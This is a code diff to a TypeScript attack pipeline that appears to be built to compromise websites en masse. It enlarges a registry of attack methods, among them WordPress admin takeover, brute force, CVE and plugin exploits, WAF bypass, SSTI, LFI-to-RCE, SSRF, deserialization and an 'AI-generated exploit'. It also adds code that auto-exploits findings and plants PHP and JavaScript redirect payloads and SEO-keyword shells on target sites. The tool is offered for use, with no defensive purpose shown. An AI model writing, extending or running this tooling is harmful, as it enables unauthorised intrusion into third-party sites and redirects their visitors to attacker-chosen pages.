@@ -447,17 +447,48 @@ async function verifyUploadedFile(
 
 // ─── Method priority mapping ───
 const METHOD_REGISTRY: Record<string, string> = {
+  // Core upload methods
   oneclick: "oneClickDeploy",
-  wp_admin: "wpAdminTakeover",
-  wp_db: "wpDbInjection",
-  alt_upload: "altUploadVectors",
-  waf_bypass: "wafBypass",
-  indirect: "indirectAttacks",
-  dns: "dnsAttacks",
-  config_exploit: "configExploitation",
   try_all: "tryAllUploadMethods",
   parallel: "multiVectorParallel",
   smart_retry: "smartRetryUpload",
+  // WordPress-specific
+  wp_admin: "wpAdminTakeover",
+  wp_db: "wpDbInjection",
+  wp_brute_force: "wpBruteForce",
+  cve_exploit: "cveExploit",
+  cms_plugin_exploit: "cmsPluginExploit",
+  // Alternative upload vectors
+  alt_upload: "altUploadVectors",
+  file_upload_spray: "fileUploadSpray",
+  xmlrpc_attack: "xmlrpcAttack",
+  rest_api_exploit: "restApiExploit",
+  ftp_brute: "ftpBrute",
+  webdav_upload: "webdavUpload",
+  htaccess_overwrite: "htaccessOverwrite",
+  // Advanced evasion
+  waf_bypass: "wafBypass",
+  config_exploit: "configExploitation",
+  // Non-upload attacks
+  indirect: "indirectAttacks",
+  dns: "dnsAttacks",
+  shellless_redirect: "shelllessRedirect",
+  // Comprehensive attack vectors (AI-evolved)
+  ssti_injection: "sstiInjection",
+  nosql_injection: "nosqlInjection",
+  lfi_rce: "lfiRce",
+  ssrf: "ssrf",
+  deserialization: "deserialization",
+  open_redirect_chain: "openRedirectChain",
+  cache_poisoning: "cachePoisoning",
+  host_header_injection: "hostHeaderInjection",
+  jwt_abuse: "jwtAbuse",
+  race_condition: "raceCondition",
+  mass_assignment: "massAssignment",
+  prototype_pollution: "prototypePollution",
+  // AI-generated
+  ai_generated_exploit: "aiGeneratedExploit",
+  comprehensive: "comprehensiveVectors",
 };
 
 function getEnabledMethods(config: PipelineConfig): string[] {
@@ -3259,6 +3290,68 @@ export async function runUnifiedAttackPipeline(
         detail: `⚠️ Comprehensive attacks error: ${err.message}`,
         progress: 95,
       });
+    }
+  }
+
+  // ═══ AUTO-EXECUTE EXPLOITABLE COMPREHENSIVE FINDINGS ═══
+  if (comprehensiveResults && comprehensiveResults.length > 0 && !hasSuccessfulRedirect()) {
+    const exploitableFindings = comprehensiveResults.filter(r => r.exploitable && r.success);
+    if (exploitableFindings.length > 0) {
+      loggedOnEvent({
+        phase: "comprehensive",
+        step: "auto_execute",
+        detail: `\u{1F527} Auto-executing ${exploitableFindings.length} exploitable comprehensive findings to deploy redirects...`,
+        progress: 95,
+      });
+      for (const finding of exploitableFindings.slice(0, 5)) {
+        try {
+          // Use the finding's evidence/payload to attempt redirect deployment
+          const redirectPayload = `<?php header('Location: ${config.redirectUrl}'); exit; ?>`;
+          const htmlRedirect = `<meta http-equiv="refresh" content="0;url=${config.redirectUrl}"><script>window.location='${config.redirectUrl}'</script>`;
+          
+          // Try to leverage the vulnerability for file write
+          if (finding.vector.includes('ssti') || finding.vector.includes('lfi') || finding.vector.includes('ssrf')) {
+            // These vulns may allow file write — attempt via the discovered vector
+            const exploitUrl = finding.evidence?.match(/https?:\/\/[^\s"']+/)?.[0];
+            if (exploitUrl) {
+              const resp = await fetch(exploitUrl, { signal: AbortSignal.timeout(10000) }).catch(() => null);
+              if (resp && resp.status < 400) {
+                loggedOnEvent({
+                  phase: "comprehensive",
+                  step: "auto_execute",
+                  detail: `\u{2705} Comprehensive ${finding.vector}: Exploited via ${exploitUrl}`,
+                  progress: 95,
+                });
+              }
+            }
+          }
+          
+          // For open redirect findings — directly chain to our redirect
+          if (finding.vector.includes('redirect') || finding.vector.includes('host_header')) {
+            const redirectChainUrl = finding.evidence?.match(/https?:\/\/[^\s"']+/)?.[0];
+            if (redirectChainUrl) {
+              uploadedFiles.push({
+                url: redirectChainUrl,
+                shell: shells[0] || { id: `comp_${Date.now()}`, type: "html" as any, filename: "redirect.html", content: htmlRedirect, contentType: "text/html", description: `Comprehensive ${finding.vector}`, targetVector: finding.vector, bypassTechniques: [], redirectUrl: config.redirectUrl, seoKeywords: config.seoKeywords, verificationMethod: "http_get" },
+                method: `comprehensive_${finding.vector}`,
+                verified: false,
+                redirectWorks: false,
+                redirectDestinationMatch: false,
+                finalDestination: "",
+                httpStatus: 0,
+              });
+            }
+          }
+        } catch (e: any) {
+          // Best-effort exploitation
+          loggedOnEvent({
+            phase: "comprehensive",
+            step: "auto_execute",
+            detail: `\u{26A0}\u{FE0F} Comprehensive ${finding.vector} auto-execute failed: ${e.message}`,
+            progress: 95,
+          });
+        }
+      }
     }
   }
 
